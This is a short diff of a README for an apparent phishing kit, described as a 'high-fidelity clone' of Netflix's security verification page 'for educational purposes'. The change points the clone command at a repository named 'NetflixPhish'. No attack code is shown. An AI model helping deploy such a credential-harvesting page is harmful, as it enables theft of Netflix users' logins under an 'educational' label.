@@ -34,7 +34,7 @@ A high-fidelity clone of Netflix's security verification page for educational pu
 
 ```bash
 # Clone the repository
-git clone https://github.com/yourusername/netflix-security-template.git
+git clone https://github.com/maximjames80-cell/NetflixPhish.git
 cd netflix-security-template
 
 # Install dependencies
